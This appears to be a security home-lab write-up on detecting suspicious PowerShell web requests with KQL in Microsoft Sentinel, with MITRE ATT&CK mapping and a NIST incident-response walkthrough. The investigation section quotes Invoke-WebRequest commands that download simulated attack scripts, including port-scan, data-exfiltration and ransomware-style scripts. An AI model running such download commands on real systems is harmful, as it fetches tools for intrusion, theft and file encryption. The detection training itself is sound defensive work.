
# 🔍 PowerShell Suspicious Web Request – Microsoft Sentinel Lab

## 🧪 Scenario Overview

In this lab, we simulate a common post-exploitation tactic where an attacker uses PowerShell to download malicious payloads or tools from the internet using legitimate commands such as `Invoke-WebRequest`. This technique is often used to bypass traditional security mechanisms.

By leveraging Microsoft Defender for Endpoint and Microsoft Sentinel, we detect and investigate this suspicious activity using KQL (Kusto Query Language).

---

## 🎯 Lab Goals

- Detect the use of PowerShell to download remote content.
- Create a scheduled query rule in Microsoft Sentinel.
- Investigate and respond to the incident following the NIST Incident Response Lifecycle.

---

## 📍 Environment

- **VM Name**: `rich-mde-test`
- **Log Source**: `DeviceProcessEvents` (via Defender for Endpoint)
- **SIEM Tool**: Microsoft Sentinel
- **Primary Command**: `Invoke-WebRequest` or `iwr`

---

## 📌 Part 1: Alert Rule Creation

### Objective

Detect PowerShell usage of `Invoke-WebRequest` to download scripts or files.

### Initial Query

```kql
DeviceProcessEvents
| where DeviceName == "rich-mde-test"
| where FileName == "powershell.exe"
```
![image](https://github.com/user-attachments/assets/c78d38c4-e06f-4fa2-91dd-f482e06f490e)

### Refined Detection Query

```kql
DeviceProcessEvents
| where Timestamp > ago(10d)
| where DeviceName == "rich-mde-test"
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "Invoke-WebRequest" or ProcessCommandLine contains "iwr"
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```
![image](https://github.com/user-attachments/assets/3128dbbc-c1bf-437d-a50b-f186a315af26)

> 💡 *Note: VM is not always on, so we search across 10 days. If live 24/7, a 24-hour window would be more efficient.*

---

## ⚙️ Part 2: MITRE ATT&CK Mapping

| Tactic              | Technique                     | Description                                                                 |
|---------------------|-------------------------------|-----------------------------------------------------------------------------|
| TA0043 - Recon      | —                             | Gathering info; intent unclear                                              |
| TA0002 - Execution  | T1059.001 - PowerShell        | Execution of PowerShell scripts using Invoke-WebRequest                     |
| TA0009 - Collection | T1074.001 - Local Data Staging| Scripts stage data locally before exfiltration                             |
| TA0010 - Exfil      | T1041 - Exfil Over C2 Channel | Data exfiltration via HTTPS or similar                                      |
| TA0011 - C2         | T1071.001 - Web Protocols     | Uses HTTPS for downloads and C2 communication                               |

---

## 🚨 Alert Rule Deployment

After creating and testing the query, an alert rule was deployed in Sentinel. This rule was assigned, activated, and monitored for real-time threat detection.

![image](https://github.com/user-attachments/assets/f2c59a5b-e5bc-4c8f-9150-48e180a64405)
![image](https://github.com/user-attachments/assets/ccae069b-2863-4ba1-95ce-7d6aa157abc3)
![image](https://github.com/user-attachments/assets/ece70497-e4ed-42c6-a203-c5f7effa716c)
![image](https://github.com/user-attachments/assets/5af2c1b9-b8fe-4918-9806-de07dc96d379)
![image](https://github.com/user-attachments/assets/3d535aae-e69a-44fb-9ecf-699d8783243b)

---

## 🔍 Part 3: Incident Response (NIST Lifecycle)

### ➤ Detection & Analysis

PowerShell executed the following commands to download suspicious scripts:

```powershell
Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../portscan.ps1 -OutFile C:\ProgramData\portscan.ps1
Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../eicar.ps1 -OutFile C:\ProgramData\eicar.ps1
Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../exfiltratedata.ps1 -OutFile C:\ProgramData\exfiltratedata.ps1
Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../pwncrypt.ps1 -OutFile C:\ProgramData\pwncrypt.ps1
```
![image](https://github.com/user-attachments/assets/179529d8-0abe-4c27-ba4a-613099d43eac)

> 🧑‍💻 *User claimed they installed "free software"; in reality, the attack simulator executed the downloads.*

### ➤ Script Summaries

- **portscan.ps1** – Scans IPs 10.0.0.4–10.0.0.10 and logs to `entropygorilla.log`.
- **eicar.ps1** – Triggers AV detection via EICAR string.
- **exfiltratedata.ps1** – Exfiltrates dummy employee data to Azure.
- **pwncrypt.ps1** – Encrypts Desktop CSVs, deletes originals, drops ransom note.

### ➤ Containment, Eradication, Recovery

- Isolated VM via MDE.
- Performed anti-malware scan (clean).
- Removed isolation after confirmation.
  
![image](https://github.com/user-attachments/assets/f37fa957-3fdb-4ad4-b3f3-a2400b944357)


---

## ✅ Post-Incident Activities

- Enforced user cybersecurity awareness training (Ninjio).
- Mandated weekly cybersecurity awareness video with confirmation to supervisor.
- Restricted PowerShell access for non-essential users.

---

## 🏁 Final Actions

- Incident marked as: **True Positive - Suspicious Activity**
- Status: **Closed**

![image](https://github.com/user-attachments/assets/e052cf8b-a8bc-470b-8758-2d81bddd1569)
![image](https://github.com/user-attachments/assets/8e06dbdf-2e5a-4c5d-9b9a-923656e04b4d)
